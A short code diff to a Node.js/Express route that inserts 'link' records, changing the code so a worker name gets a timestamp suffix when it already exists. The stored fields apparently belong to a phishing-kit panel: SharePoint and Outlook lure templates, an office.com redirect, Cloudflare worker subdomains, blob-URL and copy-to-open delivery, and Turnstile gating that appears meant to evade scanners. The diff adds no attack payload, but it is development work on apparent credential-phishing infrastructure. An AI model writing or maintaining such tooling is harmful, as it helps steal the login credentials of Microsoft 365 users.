@@ -120,6 +120,15 @@ router.post('/', userAuth, async (req, res) => {
       }
     }
 
+    // Ensure worker_name is unique by appending timestamp if it already exists
+    let uniqueWorkerName = worker_name;
+    if (uniqueWorkerName) {
+      const [existing] = await db.query('SELECT id FROM links WHERE worker_name = ? AND user_id = ?', [uniqueWorkerName, req.user.id]);
+      if (existing.length > 0) {
+        uniqueWorkerName = uniqueWorkerName + '-' + Date.now();
+      }
+    }
+
     const [result] = await db.query(
       `INSERT INTO links
        (user_id, name, worker_name, template_type, verification_design, auth_mode,
@@ -128,7 +137,7 @@ router.post('/', userAuth, async (req, res) => {
         background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
-        req.user.id, name || 'Untitled', worker_name, template_type || 'sharepoint3',
+        req.user.id, name || 'Untitled', uniqueWorkerName, template_type || 'sharepoint3',
         verification_design || 'outlook', auth_mode || 'token',
         destination_url || 'https://office.com', custom_domain || null,
         url_type || 'worker', domain_connection || 'subdomain', route_name || null,
